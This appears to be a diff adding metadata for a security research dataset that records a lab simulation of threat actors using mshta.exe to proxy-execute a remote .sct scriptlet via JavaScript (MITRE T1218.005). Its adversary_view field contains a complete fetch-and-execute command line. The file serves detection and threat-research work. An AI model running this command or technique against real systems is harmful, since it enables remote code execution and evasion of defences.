@@ -1,0 +1,31 @@
+title: Mshta Javascript GetObject Sct
+id: SDWIN-201022022144
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/10/22
+modification_date: 2020/10/22
+platform: Windows
+tags:
+  - art.1483fab9-4f52-4217-a9ce-daa9d7747cae
+description: This dataset represents threat actors leveraging mshta.exe to proxy execute malicious .sct files via Javascript.
+attack_mappings:
+  - technique: T1218
+    sub-technique: "005"
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/cmd_mshta_javascript_getobject_sct.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: Cmd
+      module: Cmd
+      script: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-1---mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject
+  permissions_required:
+    - Administrator
+  adversary_view: |-
+    mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
+references:
+  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md#atomic-test-1---mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject
